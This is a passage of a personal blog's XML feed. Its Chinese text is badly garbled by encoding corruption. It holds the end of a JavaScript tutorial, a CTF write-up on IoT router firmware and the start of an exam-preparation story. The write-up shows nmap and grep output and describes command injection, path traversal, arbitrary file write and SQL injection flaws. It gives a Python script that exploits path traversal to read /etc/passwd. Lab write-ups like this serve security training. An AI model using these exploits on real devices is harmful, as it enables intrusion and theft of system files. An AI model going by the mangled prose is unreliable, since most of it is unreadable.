class="line">å‘½åè§„èŒƒï¼šifã€varç­‰å…³é”®å­—ä¸èƒ½ä½œå˜é‡ï¼Œåªèƒ½ç”±ä¸‹åˆ’çº¿ã€å­—æ¯ã€æ•°å­—ã€$ç»„æˆï¼Œä¸”ä¸ä»¥æ•°å­—å¼€å¤´ï¼Œä¸¥æ ¼åŒºåˆ†å¤§å°å†™</span><br><span class="line">â€»å˜é‡ä¸å…è®¸é‡å¤å£°æ˜</span><br></pre></td></tr></table></figure><h3 id="æ•°ç»„"><a href="#æ•°ç»„" class="headerlink" title="æ•°ç»„"></a>æ•°ç»„</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">å£°æ˜æ–¹å¼ï¼šlet arr = [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;]</span><br><span class="line">å–ï¼šlet a = arr[0]</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-JS-åŸºç¡€&quot;&gt;&lt;a href=&quot;#1-JS-åŸºç¡€&quot; class=&quot;headerlink&quot; title=&quot;1. JS åŸºç¡€&quot;&gt;&lt;/a&gt;1. JS åŸºç¡€&lt;/h2&gt;&lt;h3 id=&quot;ä»‹ç»&quot;&gt;&lt;a href=&quot;#ä»‹ç»&quot; class=&quot;headerlink&quot; title=</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>è¥¿æ¹–è®ºå‰‘æ€»å†³èµ›IOTå¤ç°</title>
    <link href="http://example.com/2023/05/18/xhlj-iot/"/>
    <id>http://example.com/2023/05/18/xhlj-iot/</id>
    <published>2023-05-18T04:40:26.000Z</published>
    <updated>2023-05-27T08:09:10.885Z</updated>
    
    <content type="html"><![CDATA[<p>å¤ç°ä¸‹è®¸ä¹…ä»¥å‰æ‰“è¿‡çš„è¥¿æ¹–è®ºå‰‘æ€»å†³èµ›ï¼ˆé™¤è“ç‰™å¤–çš„èµ›é¢˜ï¼‰ã€‚</p><p>å‚è€ƒå®˜æ–¹ wpï¼š<a href="https://mp.weixin.qq.com/s?__biz=MzUyMDEyNTkwNA==&mid=2247493801&idx=1&sn=d3f98938ae8df76c28accc580a4e6c17&chksm=f9ed8416ce9a0d00c54d8ab9749e7d76792b82b06780ae103b3879c154b80654e0c4ef3c1881&mpshare=1&scene=23&srcid=0514VBErwvCkEnQ0tE0fpVXP&sharer_sharetime=1684053359058&sharer_shareid=72e10aaa438d40848d3d5a32d35bc286#rd">2022è¥¿æ¹–è®ºå‰‘ IoT-AWD èµ›é¢˜å®˜æ–¹ WriteUp ï¼ˆä¸Šç¯‡ï¼‰ï¼šä¸€å·å›ºä»¶&amp;äºŒå·å›ºä»¶</a>å’Œ<a href="https://mp.weixin.qq.com/s?__biz=MzUyMDEyNTkwNA==&mid=2247493817&idx=1&sn=3fc9e016df8c42e204782603be5fbac4&chksm=f9ed8406ce9a0d106ec8126f8edb451659a5096f877b968716cb5428eabb8f18feb5ab58d7e9&scene=178&cur_album_id=1375767735803805698#rd">2022è¥¿æ¹–è®ºå‰‘ IoT-AWD èµ›é¢˜å®˜æ–¹ WriteUp ï¼ˆä¸‹ç¯‡ï¼‰ï¼šä¸‰å·å›ºä»¶</a>ã€‚</p><span id="more"></span><h2 id="ä¸€å·å›ºä»¶"><a href="#ä¸€å·å›ºä»¶" class="headerlink" title="ä¸€å·å›ºä»¶"></a>ä¸€å·å›ºä»¶</h2><h3 id="xhttpd"><a href="#xhttpd" class="headerlink" title="xhttpd"></a>xhttpd</h3><p>å…ˆå¯¹é¶æœº IP è¿›è¡Œç«¯å£æ‰«æï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.1.1</span><br></pre></td></tr></table></figure><p>å‘ç° 8080 ç«¯å£æ˜¯å¼€æ”¾çš„ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2023-05-18 20:49 CST</span><br><span class="line">Nmap scan report for OpenWrt.lan (192.168.1.1)</span><br><span class="line">Host is up (0.0031s latency).</span><br><span class="line">Not shown: 995 filtered ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">53/tcp   open  domain</span><br><span class="line">80/tcp   open  http</span><br><span class="line">443/tcp  open  https</span><br><span class="line">8080/tcp open  http-proxy</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 89.56 seconds</span><br></pre></td></tr></table></figure><p>åœ¨å›ºä»¶æå–å¥½çš„æ–‡ä»¶ç›®å½•ä¸‹ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -rn &quot;8080&quot;</span><br></pre></td></tr></table></figure><p>ä¾¿å¯ä»¥æ‰¾åˆ°è·Ÿç«¯å£æœ‰å…³çš„é…ç½®æ–‡ä»¶<code>etc/boa/boa.conf</code>ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">www/luci-static/resources/view/status/channel_analysis.js:32:if(res.vht_operation!=null)&#123;center_channels[0]=res.vht_operation.center_freq_1;if(res.vht_operation.channel_width==80)&#123;chan_width=8;res.channel_width=&quot;80 MHz&quot;;&#125;else if(res.vht_operation.channel_width==8080)&#123;res.channel_width=&quot;80+80 MHz&quot;;chan_width=8;center_channels.push(res.vht_operation.center_freq_2);&#125;else if(res.vht_operation.channel_width==160)&#123;res.channel_width=&quot;160 MHz&quot;;chan_width=16;&#125;&#125;</span><br><span class="line">usr/share/hwdata/pci.ids:7426:8080  FastLinQ QL41000 Series 10/25/40/50GbE Controller (FCoE)</span><br><span class="line">usr/share/hwdata/pci.ids:13425:1043 8080  A7V333 motherboard</span><br><span class="line">usr/share/hwdata/pci.ids:15298:8080  AEC67160 SCSI</span><br><span class="line">usr/share/hwdata/pci.ids:19218:8080  VScom 800L 8 port serial adaptor</span><br><span class="line">usr/share/hwdata/pci.ids:34413:8080  ASC-29320A U320 w/HostRAID</span><br><span class="line">usr/share/hwdata/usb.ids:6644:8080  IBM C-It Webcam</span><br><span class="line">usr/share/hwdata/usb.ids:17126:8080  CCS100 - Compact Spectrometer</span><br><span class="line">usr/share/hwdata/usb.ids:18491:8080  1 port to Serial</span><br><span class="line">Binary file usr/bin/socat matches</span><br><span class="line">etc/boa/boa.conf:25:Port 8080</span><br></pre></td></tr></table></figure><p>å¹¶å¯ä»¥çŸ¥é“è¯¥ web æœåŠ¡æ˜¯ç”± boa æ¡†æ¶æ­å»ºçš„ï¼š</p><blockquote><p>BOA æ˜¯ä¸€ç§éå¸¸å°å·§çš„ web æœåŠ¡å™¨ï¼Œç”¨æ¥è´Ÿè´£å¤„ç†å®¢æˆ·ç«¯æˆ–è€…æ˜¯æµè§ˆå™¨ç«¯çš„ http è¯·æ±‚ï¼Œå› ä¸ºå…¶ç‰¹æ€§å°å·§ï¼Œæ€§èƒ½ä¼˜ç§€ï¼Œæ•…è€Œé€‚åˆåº”ç”¨äºåµŒå…¥å¼ç³»ç»Ÿã€‚BOA æ”¯æŒ CGI äº¤äº’ï¼Œæµè§ˆå™¨æ¯æ¬¡å‘é€ä¸€ä¸ª POST è¯·æ±‚ï¼ŒBOA ä¼šå¯¹åº” fork ä¸€ä¸ª CGI è¿›ç¨‹ï¼Œæ•°æ®å‘é€å®Œæˆåï¼ŒCGI è¿›ç¨‹é€€å‡ºã€‚</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># etc/boa/boa.conf</span><br><span class="line">Port 8080</span><br><span class="line">User root</span><br><span class="line">Group root</span><br><span class="line">ErrorLog /tmp/error_log</span><br><span class="line">AccessLog /tmp/access_log</span><br><span class="line">ServerName www.your.org.here</span><br><span class="line">ã€*ã€‘DocumentRoot /usr/bin/www</span><br><span class="line">UserDir public_html</span><br><span class="line">DirectoryIndex index.html</span><br><span class="line">KeepAliveMax 1000</span><br><span class="line">KeepAliveTimeout 10</span><br><span class="line">MimeTypes /etc/mime.types</span><br><span class="line">DefaultType text/plain</span><br><span class="line">CGIPath /bin:/usr/bin:/usr/local/bin</span><br><span class="line">ã€*ã€‘ScriptAlias /cgi-bin/ /usr/bin/www/cgi-bin/</span><br></pre></td></tr></table></figure><p>ç”±é…ç½®å¯çŸ¥ï¼Œweb è·¯å¾„ä½äº /usr/bin/wwwï¼Œ/cgi-bin/ è·¯å¾„è¢«é‡å®šä½æˆ /usr/bin/www/cgi-bin/ è·¯å¾„ï¼Œåœ¨è¯¥ç›®å½•ä¸­å¯ä»¥çœ‹åˆ°ä¸€äº› cgi ç¨‹åºï¼š</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202305182109823.png" alt="image-20230518210948674" style="zoom: 50%;" /><hr><p><strong>diag.cgi</strong></p><hr><p>é¦–å…ˆæ˜¯ diag.cgiï¼Œé™¤å»å¤„ç†è¯·æ±‚å¤´çš„ä»£ç ï¼Œå…³é”®ä»£ç å¦‚ä¸‹ï¼š</p><p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202305191550805.png" alt="image-20230519154952373"></p><p>å¤§æ¦‚å¯ä»¥çœ‹å‡ºä¼ å…¥<code>type</code>å’Œ<code>param</code>ä¸¤ä¸ªå‚æ•°ï¼Œç„¶åå¯¹<code>param</code>è¿›è¡Œè¿‡æ»¤ï¼Œè¿›è¡Œ ping æˆ– curl æ“ä½œï¼Œä½†ç”±äºè¿‡æ»¤çš„æ—¶å€™æœªè¿‡æ»¤æ¢è¡Œç¬¦ï¼Œå› æ­¤å­˜åœ¨å‘½ä»¤æ³¨å…¥æ¼æ´ã€‚</p><hr><p><strong>get.cgi</strong></p><hr><p>ç„¶åæ˜¯ get.cgiï¼Œé™¤å»å¤„ç†è¯·æ±‚å¤´çš„ä»£ç ï¼Œå…³é”®ä»£ç å¦‚ä¸‹ï¼š</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202305191616858.png" alt="image-20230519161631697" style="zoom:50%;" /><p>å¤§æ¦‚å¯ä»¥çœ‹å‡ºæ¥æ”¶ä¼ å…¥çš„<code>name</code>å‚æ•°ï¼Œç„¶åå°†<code>/usr/bin/upload/</code>ä¸‹çš„æ–‡ä»¶æ‰“å°å‡ºæ¥å†åˆ æ‰ï¼Œç”±äºæœªæ£€æµ‹è·¯å¾„ç©¿è¶Šï¼Œå› æ­¤å¯ä»¥ç›´æ¥è¯»å‡ºä»»æ„æ–‡ä»¶ã€‚</p><hr><p><strong>upload.cgi</strong></p><hr><p>æœ€åæ˜¯ upload.cgiï¼Œé™¤å»å¤„ç†è¯·æ±‚å¤´çš„ä»£ç ï¼Œå…³é”®ä»£ç å¦‚ä¸‹ï¼š</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202305271508165.png" alt="image-20230527150808921" style="zoom:50%;" /><p>ä¹Ÿæ˜¯æœªæ£€æµ‹ç›®å½•ï¼Œå¯¼è‡´å¯ä»¥å®ç°æ–‡ä»¶ä»»æ„å†™ã€‚</p><hr><p><strong>xhttpd</strong></p><hr><p>åœ¨ xhttpd ä¸­åŒæ ·å­˜åœ¨ä¸€äº›æ¼æ´ï¼Œè®¾ç½®ç¯å¢ƒå˜é‡æ—¶æœªæ·»åŠ  HTTP_ å‰ç¼€ï¼Œç”¨æˆ·å¯ä»¥æ§åˆ¶ LD_PRELOAD å˜é‡å®ç°é“¾æ¥åº“åŠ«æŒã€‚è€Œèº«ä»½éªŒè¯éƒ¨åˆ†ä¼šä½¿ç”¨ç”¨æˆ·æäº¤çš„æ•°æ®æ‹¼æ¥ SQL è¯­å¥æ‰§è¡Œï¼Œå­˜åœ¨ SQL æ³¨å…¥æ¼æ´ï¼Œ/tmp/user.db ä¸­é»˜è®¤ä¿å­˜äº†ä¸€ admin è´¦æˆ·ï¼Œè¯¥è´¦æˆ·å¯†ç éšæœºï¼Œåˆ©ç”¨ SQL æ³¨å…¥å¯ä»¥è¯»å‡º admin è´¦æˆ·çš„å¯†ç ï¼Œè¿›è¡Œåç»­åˆ©ç”¨ã€‚ï¼š</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202305271533727.png" alt="image-20230527153333665" style="zoom:50%;" /><p>xhttpd ä¸­åŒ…å«äº†åŸºæœ¬çš„ http å¤´æ£€æµ‹ï¼š</p><p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202305271601067.png" alt="image-20230527160112938"></p><p>ä¸”æœ‰äº› db ä¿¡æ¯å¯ä»¥åœ¨æ–‡ä»¶ä¸­çœ‹åˆ°ï¼š</p><p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202305271603317.png" alt="image-20230527160313253"></p><h4 id="è§£æ³•1"><a href="#è§£æ³•1" class="headerlink" title="è§£æ³•1"></a>è§£æ³•1</h4><p>åˆ©ç”¨ get.cgi çš„ä»»æ„è¯»æ–‡ä»¶ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#  -*- UTF-8 -*- #</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@filename:exp.py</span></span><br><span class="line"><span class="string">@author:Anza</span></span><br><span class="line"><span class="string">@time:2023-05-14</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">method1</span>():</span><br><span class="line"></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((<span class="string">&quot;192.168.1.1&quot;</span>, <span class="number">8080</span>))</span><br><span class="line">    data = <span class="string">&quot;GET /cgi-bin/get.cgi?name=/../../../etc/passwd HTTP/1.1\r\nHost: %s\r\nAuthorization: Basic guest:guest\r\n\r\n&quot;</span> % (<span class="string">&quot;1.1.1.1&quot;</span>)</span><br><span class="line">    s.sendall(data.encode())</span><br><span class="line">    </span><br><span class="line">    res = s.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br><span class="line">    res = s.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line">    s.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    method1()</span><br></pre></td></tr></table></figure><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202305271609990.png" alt="image-20230527160906904" style="zoom:80%;" />]]></content>
    
    
    <summary type="html">&lt;p&gt;å¤ç°ä¸‹è®¸ä¹…ä»¥å‰æ‰“è¿‡çš„è¥¿æ¹–è®ºå‰‘æ€»å†³èµ›ï¼ˆé™¤è“ç‰™å¤–çš„èµ›é¢˜ï¼‰ã€‚&lt;/p&gt;
&lt;p&gt;å‚è€ƒå®˜æ–¹ wpï¼š&lt;a href=&quot;https://mp.weixin.qq.com/s?__biz=MzUyMDEyNTkwNA==&amp;mid=2247493801&amp;idx=1&amp;sn=d3f98938ae8df76c28accc580a4e6c17&amp;chksm=f9ed8416ce9a0d00c54d8ab9749e7d76792b82b06780ae103b3879c154b80654e0c4ef3c1881&amp;mpshare=1&amp;scene=23&amp;srcid=0514VBErwvCkEnQ0tE0fpVXP&amp;sharer_sharetime=1684053359058&amp;sharer_shareid=72e10aaa438d40848d3d5a32d35bc286#rd&quot;&gt;2022è¥¿æ¹–è®ºå‰‘ IoT-AWD èµ›é¢˜å®˜æ–¹ WriteUp ï¼ˆä¸Šç¯‡ï¼‰ï¼šä¸€å·å›ºä»¶&amp;amp;äºŒå·å›ºä»¶&lt;/a&gt;å’Œ&lt;a href=&quot;https://mp.weixin.qq.com/s?__biz=MzUyMDEyNTkwNA==&amp;mid=2247493817&amp;idx=1&amp;sn=3fc9e016df8c42e204782603be5fbac4&amp;chksm=f9ed8406ce9a0d106ec8126f8edb451659a5096f877b968716cb5428eabb8f18feb5ab58d7e9&amp;scene=178&amp;cur_album_id=1375767735803805698#rd&quot;&gt;2022è¥¿æ¹–è®ºå‰‘ IoT-AWD èµ›é¢˜å®˜æ–¹ WriteUp ï¼ˆä¸‹ç¯‡ï¼‰ï¼šä¸‰å·å›ºä»¶&lt;/a&gt;ã€‚&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>åŒéä¸€æˆ˜ä¸Šå²¸æ­¦æ±‰å¤§å­¦ç½‘å®‰ä¸“ç¡•</title>
    <link href="http://example.com/2023/04/03/hznu2whu/"/>
    <id>http://example.com/2023/04/03/hznu2whu/</id>
    <published>2023-04-03T06:35:48.000Z</published>
    <updated>2023-04-07T07:12:33.976Z</updated>
    
    <content type="html"><![CDATA[<img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202304042018896.png" alt="image-20230404201805060" style="zoom: 25%;" /><span id="more"></span><h2 id="ä¸ªäººæƒ…å†µ"><a href="#ä¸ªäººæƒ…å†µ" class="headerlink" title="ä¸ªäººæƒ…å†µ"></a>ä¸ªäººæƒ…å†µ</h2><p>æœ¬äººå°±è¯»äºæ­å·æŸæ‰€åŒéé™¢æ ¡ï¼Œæœ¬ç§‘ä¸“ä¸šä¸ºè®¡ç®—æœºï¼ˆé‡‘èæ–¹å‘ï¼‰ï¼Œåˆè¯•æˆç»© 392ï¼ˆ69+84+129+110ï¼‰ã€‚</p><p>æŠ¥è€ƒæ­¦å¤§ç½‘å®‰ä¸€æ–¹é¢æ˜¯å› ä¸ºè‡ªå·±å¯¹æœ¬ç§‘ä¸“ä¸šæ–¹å‘ä¸æ˜¯å¾ˆæ„Ÿå…´è¶£ï¼Œå¦ä¸€æ–¹é¢ä½œä¸ºä¸€å CTFer å°é€æ˜ï¼Œåœ¨æˆ‘é™¢çš„ç½‘å®‰å®éªŒå®¤é‡Œåšå‡ºäº†ç‚¹æˆç»©ï¼Œæƒ³å»æ›´é«˜çš„å¹³å°çœ‹çœ‹å¤§ä½¬ã€‚</p><p>æ‹©æ ¡è¿‡ç¨‹ï¼šæš¨å—å¤§å­¦ç½‘å®‰ä¸“ =&gt; å¦é—¨å¤§å­¦è®¡ä¸“ =&gt; æ­¦æ±‰å¤§å­¦ç½‘å®‰ä¸“ã€‚</p><p>é€‰æ‹©æš¨å¤§æ˜¯å› ä¸ºå®ƒä»¬ç½‘å®‰å‘å±•ä¼¼ä¹æŒºä¸é”™çš„ï¼ŒCTF æˆ˜é˜Ÿä¹Ÿå¾ˆç‰›ï¼Œè€Œä¸”åªè€ƒä¸€é—¨æ•°æ®ç»“æ„ï¼ŒåæœŸ F*cking 408 å­¦ä¸ä¸‹å»äº†å°±ç›´æ¥è½¬ï¼›ç„¶åæƒ³å†²å¦å¤§ä¸€æ–¹é¢æ˜¯å› ä¸º 408 ç®—æ˜¯å­¦ä¸‹å»äº†ï¼Œå¦ä¸€æ–¹é¢æœ‰ä¸ªåšäºŒè¿›åˆ¶å®‰å…¨å¾ˆç‰›çš„è€å¸ˆåœ¨è®¡é™¢ï¼ˆä¹Ÿå›¾å¦å¤§çš„ç¾ä¸½ï¼Œä½†éæœ¬éƒ¨æ ¡åŒºï¼‰ï¼›å†åæ¥ï¼Œå¦å¤§æ‹›ç”Ÿåå•ä¸€å‡ºï¼Œäººæ•°ç åŠï¼Œè€Œæ­¦å¤§ç½‘å®‰é‚£è¾¹ä¼ æ¥æ¶ˆæ¯è¯´ä¿ç ”é€‰æ‰‹é¸½äº†å¥½å¤šï¼Œåé¢éƒ½è…¾å‡ºæ¥ç»™ç»Ÿæ‹›äº†ï¼Œé‚å†²ï¼ˆæ­¦å¤§ä¹Ÿç¾ï¼Œä½†ä¹Ÿéæœ¬éƒ¨æ ¡åŒºğŸ˜­ï¼‰ã€‚</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202304042052686.jpg" alt="img" style="zoom: 25%;" /><h2 id="åˆè¯•è§„åˆ’"><a href="#åˆè¯•è§„åˆ’" class="headerlink" title="åˆè¯•è§„åˆ’"></a>åˆè¯•è§„åˆ’</h2><p>æ­¦å¤§ç½‘å®‰ä¸“ç¡•çš„è€ƒè¯•ç§‘ç›®ä¸ºï¼šæ”¿æ²»ï¼Œè‹±è¯­äºŒï¼Œæ•°å­¦äºŒï¼Œ408è®¡ç®—æœºä¸“ä¸šåŸºç¡€ã€‚</p><p>é‰´äºæ•°å­¦ã€ä¸“ä¸šè¯¾åŸºç¡€æ¯”è¾ƒè–„å¼±ï¼Œæœ¬äººä» 2022 å¹´ä¸€æœˆå°±å¼€å§‹å‡†å¤‡ï¼Œå®é™…ä¸Šä¸‰æœˆå¼€å§‹å‡†å¤‡ä¹Ÿå®Œå…¨èµ¶å¾—ä¸Šã€‚</p><h3 id="æ”¿æ²»"><a href="#æ”¿æ²»" class="headerlink" title="æ”¿æ²»"></a>æ”¿æ²»</h3><p>æ”¿æ²»æ— éœ€å¤ªæ—©å‡†å¤‡ï¼Œå¤§éƒ¨åˆ†è€ƒç‚¹ï¼ˆå°¤å…¶æ¯›ä¸­ç‰¹å’Œå²çº²ï¼‰éƒ½ç»“åˆäº†<strong>æ—¶äº‹</strong>ï¼ŒåæœŸä¼šæœ‰å¾ˆå¤šåå¸ˆå¸®ä½ æ•´ç†ã€‚</p><p>æˆ‘æ˜¯ 9 æœˆå¼€å§‹å‡†å¤‡æ”¿æ²»çš„ï¼Œç”¨çš„å‚è€ƒä¹¦ä¸ºã€Šè‚–ç§€è£â€”â€”çŸ¥è¯†ç‚¹ç²¾è®²ç²¾ç»ƒã€‹å’Œã€Š1000é¢˜ã€‹ï¼Œå¬çš„æ˜¯è…¿å§çš„åŸºç¡€ç­ï¼Œå¬ä¸€ç« åšä¸€ç« ã€Š1000ã€‹é¢˜ï¼ˆåˆ†æé¢˜ä¸åšï¼‰ï¼Œç„¶åè·Ÿçš„ä¹Ÿæ˜¯è…¿å§çš„å¼ºåŒ–ç­å’ŒæŠ€å·§ç­ï¼Œè…¿å§æœ‰å¯¹<strong>å…³é”®è¯</strong>åšæ•´ç†ï¼Œå¯¹æˆ‘å˜æ¸…çŸ¥è¯†æ¡†æ¶æŒºæœ‰å¸®åŠ©çš„ï¼ŒæŠ€å·§ç­å°±è§ä»è§æ™ºå§ï¼Œä¼¼ä¹ä»Šå¹´æœ‰å¾ˆå¤šäººæ ½åœ¨è¿™ä¸Šé¢äº†ï¼Œä½†æˆ‘ä¸ªäººè§‰å¾—è¿˜è¡Œã€‚åæ­£å°±åœ¨é‚£å‡ ä¸ªè€ƒç ”é£è¯„ä¸é”™çš„æ”¿æ²»è€å¸ˆé‡Œè·Ÿç´§ä¸€ä¸ªå°±å¯¹äº†ï¼Œæ”¿æ²»åˆ†æ•°å·®åˆ«ä¸å¤§ã€‚</p><p>åæœŸæŠ¼é¢˜å·æˆ‘åªå‚è€ƒäº†<strong>è‚–å››è‚–å…«</strong>ï¼Œè‚–å…«è€ƒå‰ä¸€ä¸ªæœˆä¼šæœ‰ï¼Œè‚–å››è€ƒå‰ä¸¤å‘¨ä¼šæœ‰ï¼Œä¸ªäººè®¤ä¸ºèƒŒè¯µçš„ä¼˜å…ˆçº§ï¼šè‚–å››å…¨å· &gt; è‚–å…«çš„é€‰æ‹©é¢˜ &gt; è‚–å…«çš„åˆ†æé¢˜ã€‚æŠ¼é¢˜å·ä¸ä¸€å®šèƒ½å›Šæ‹¬æ‰€æœ‰é¢˜ç›®ï¼Œä¸»è¦å°±æ˜¯å·©å›ºçŸ¥è¯†ç‚¹å’Œå­¦ä¹ è¯æœ¯ç”¨çš„ï¼Œå¤šèƒŒæ€»æ²¡é”™ï¼Œæœ€åå‡ å¤©è‡ªå·±æœ€å¥½èƒ½æ€»ç»“ä¸€å¥—åˆ†æé¢˜çš„å†™æ³•ã€‚é—²ç€çš„æ—¶å€™å¯ä»¥åœ¨å°ç¨‹åºä¸Šåˆ·åˆ·ä¹ é¢˜å†Œæˆ–è€…æŠ¼é¢˜å·ã€‚</p><p>ç”±äºæœ¬äººæ²¡æœ‰å¤æ ¸ï¼Œå‚è€ƒç½‘ä¸Šè¿˜ç®—æƒå¨çš„ç­”æ¡ˆï¼Œä¼°æ‘¸ç€å®¢è§‚38 + ä¸»è§‚31ã€‚</p><h3 id="è‹±è¯­"><a href="#è‹±è¯­" class="headerlink" title="è‹±è¯­"></a>è‹±è¯­</h3><p>æœ¬äººè‹±è¯­åŸºç¡€è¿˜è¡Œï¼Œå››å…­çº§ 550+ï¼Œåœ¨è€ƒç ”è¿‡ç¨‹ä¸­èŠ±åœ¨è‹±è¯­ä¸Šçš„æ—¶é—´æ¯”è¾ƒå°‘ï¼Œæ‰€ä»¥å¯èƒ½ä¸å¤ªé€‚åˆåšå‚è€ƒã€‚</p><p>æœ¬äººç”¨çš„æŸè´å•è¯ APPï¼Œæ¯å¤©æ—©ä¸Šèµ·æ¥åƒé¥­çš„æ—¶å€™åªèƒŒäº† 30 ä¸ªæ–°å•è¯ + å¤ä¹  90 ä¸ªæ—§å•è¯ï¼Œç„¶ååˆ·ä¸€ç¯‡è‹±ä¸€æˆ–è‹±äºŒçš„çœŸé¢˜å®Œå‹æˆ–è€…é˜…è¯»ã€‚ä½œæ–‡å‚è€ƒç‹æ±Ÿæ¶›çš„ä½œæ–‡ä¹¦ï¼Œæœ‰äº›æ–‡ç« å†™çš„ç¡®å®ä¸é”™ï¼Œä½†ä¹Ÿæœ‰æ–‡ç« å†™çš„æ¯”è¾ƒæ¨¡æ¿åŒ–ï¼Œæœ€å¥½æ‹¿æ¥è‡ªå·±æ”¹æ”¹ï¼Œå½“ç„¶å¦‚æœåªæƒ³æ‹¿ä¸ªä¸€èˆ¬åˆ†çš„è¯ç›´æ¥ç½‘ä¸Šæ‰¾äº›æ¨¡æ¿èƒŒå°±è¡Œäº†ã€‚ä½†å°±ç¾¤é‡Œå…„å¼Ÿä»¬çš„å‘è¨€æ¥çœ‹ï¼Œæ¹–åŒ—è‹±è¯­ä½œæ–‡é«˜ä½åˆ†å·®å¾—è›®å¤§çš„ï¼Œæœ‰æ—¶é—´è¿˜æ˜¯è¦å¤šå‡†å¤‡ä¸‹ã€‚</p><p>å»ºè®®å¯ä»¥åœ¨å››å…­çº§è€ƒè¯•å‰é›†ä¸­å‡ å¤©å‡†å¤‡ä¸‹ä½œæ–‡ï¼Œç„¶ååœ¨å››å…­çº§è€ƒè¯•ä¸Šæ¨¡æ‹Ÿä¸‹ï¼Œé¡ºä¾¿åˆ·ä¸ªåˆ†ã€‚æœ¬äººè€ƒç ”æœŸé—´è€ƒäº†ä¸¤æ¬¡å…­çº§ï¼Œå†™ä½œ/ç¿»è¯‘éƒ½è¾¾åˆ°äº† 185+ã€‚</p><p>æ€»çš„æ¥è¯´ï¼Œæˆ‘è®¤ä¸ºè€ƒç ”è‹±è¯­æŠ“å‡†<strong>å•è¯+çœŸé¢˜ç²¾è¯»</strong>å°±å¤Ÿäº†ï¼Œè‹±è¯­çš„å­¦ä¹ æ˜¯<strong>ç§¯ç´¯+è¯­æ„ŸåŸ¹å…»</strong>çš„è¿‡ç¨‹ï¼Œé¡ºä¾¿è®°å¾—æŠŠå­—ç»ƒå¥½ã€‚</p><p>ç”±äºæœ¬äººæ²¡æœ‰å¤æ ¸ï¼Œå‚è€ƒç½‘ä¸Šè¿˜ç®—æƒå¨çš„ç­”æ¡ˆï¼Œä¼°æ‘¸ç€å®¢è§‚55 + ä¸»è§‚29ã€‚</p><h3 id="æ•°å­¦"><a href="#æ•°å­¦" class="headerlink" title="æ•°å­¦"></a>æ•°å­¦</h3><p>ç”±äºæœ¬äººé«˜è€ƒæ•°å­¦ç‚¸äº†ï¼Œä¸”å¤§å­¦é‡Œé«˜æ•°å’Œçº¿ä»£å­¦å¾—ä¹Ÿæ¯”è¾ƒå·®ï¼Œå¯¹æ•°å­¦ä¸€ç›´å¿ƒæœ‰ä½™æ‚¸ï¼Œå› æ­¤åœ¨ 1 